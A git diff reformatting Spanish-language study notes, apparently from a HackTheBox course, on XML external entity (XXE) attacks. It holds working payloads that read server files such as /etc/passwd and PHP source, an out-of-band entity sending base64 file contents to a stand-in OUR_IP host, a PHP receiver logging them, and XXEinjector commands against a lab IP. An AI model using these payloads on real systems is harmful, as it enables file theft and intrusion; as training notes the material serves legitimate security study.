@@ -72,13 +72,14 @@ Para hacer una xxe, reemplazamos el parámetro que se está enviando por:
         </root>
 
 
-#########ssrf
 
 
 
-###########################################Lectura avanzada de archivos:
 
-##############CDATA:
+### Lectura avanzada de archivos:
+
+#### CDATA:
+
 Nos permite engañar al backend tomando el contenido como raw:
 
 
@@ -93,72 +94,78 @@ Ejemplo no aplicable:
 
 Desde que se prohibió el joined como medio interno, nos vemos obligado a usarlo desde afuera:
 
-LaPorota@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+LaPorota@htb[/htb]$ 
 
-<!DOCTYPE email [
-  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
-  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
-  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
-  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
-  %xxe;
-]>
-...
-<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
+        echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+
+##### Injection
+        <!DOCTYPE email [
+          <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
+          <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
+          <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
+          <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
+          %xxe;
+        ]>
+        ...
+        <email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
 
 
 
-################################## ERROR BASED XXE:
+### ERROR BASED XXE:
 
 Probamos romper el xml en la request para ver como lo resuelve el backend.
 
 Si el error nos brinda información sobre directorios o subdirectorios con rutas podemos:
 
-crear un dtd:
-<!ENTITY % file SYSTEM "file:///etc/hosts">
-<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+#### Crear un dtd:
+        <!ENTITY % file SYSTEM "file:///etc/hosts">
+        <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
 
 y luego referenciarlo desde la request:
 
-<!DOCTYPE email [ 
-  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
-  %remote;
-  %error;
-]>
+        <!DOCTYPE email [ 
+          <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+          %remote;
+          %error;
+        ]>
 
 
 
 
-#################################### Blind xxe
-################### Out-of-band Data Exfiltration
+### Blind xxe
+#### Out-of-band Data Exfiltration
+
 cramos un xml en nuestro servidor:
-<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
 
-luego un index.php
-<?php
-if(isset($_GET['content'])){
-    error_log("\n\n" . base64_decode($_GET['content']));
-}
-?>
+        <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+        <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
 
-levantamos el servidor php:
-php -S 0.0.0.0:8000
+##### luego un index.php
+        <?php
+        if(isset($_GET['content'])){
+            error_log("\n\n" . base64_decode($_GET['content']));
+        }
+        ?>
 
-inyectamos la entidad:
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE email [ 
-  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
-  %remote;
-  %oob;
-]>
-<root>&content;</root>
+##### Levantamos el servidor php:
+        php -S 0.0.0.0:8000
 
-podemos automatizar el ataque con herramientas como xxeinjector:
+##### Inyectamos la entidad:
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE email [ 
+          <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+          %remote;
+          %oob;
+        ]>
+        <root>&content;</root>
 
-git clone https://github.com/enjoiz/XXEinjector.git
+##### Podemos automatizar el ataque con herramientas como xxeinjector:
+
+        git clone https://github.com/enjoiz/XXEinjector.git
 
 
 guardamos la request http que tenemos en burp a un archivo desde el inicio hasta la declaración del xml y agregamos xxeinject ej:
+
 POST /blind/submitDetails.php HTTP/1.1
 Host: 10.129.201.94
 Content-Length: 169
@@ -171,10 +178,10 @@ Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 Connection: close
 
-<?xml version="1.0" encoding="UTF-8"?>
-XXEINJECT
+        <?xml version="1.0" encoding="UTF-8"?>
+        XXEINJECT
 
-luego corremos la herramienta con:
-LaPorota@htb[/htb]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
+##### luego corremos la herramienta con:
+        ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
 
 
